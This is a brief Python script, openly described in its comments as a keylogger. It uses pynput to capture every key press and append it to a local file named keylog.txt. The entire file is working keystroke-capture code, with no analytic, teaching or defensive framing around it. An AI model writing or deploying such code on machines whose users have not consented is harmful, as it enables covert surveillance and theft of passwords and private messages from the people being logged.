from pynput.keyboard import Key, Listener

# Function to write the pressed key to a log file
def on_press(key):
    try:
        # Open log file in append mode
        with open("keylog.txt", "a") as f:
            # Write the pressed key to the log file
            f.write(str(key) + '\n')
    except Exception as e:
        print(f"Error: {str(e)}")

# Function to listen for key presses
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        # Start listening for key presses
        listener.join()

# Main function
if __name__ == "__main__":
    # Start the keylogger
    start_keylogger()
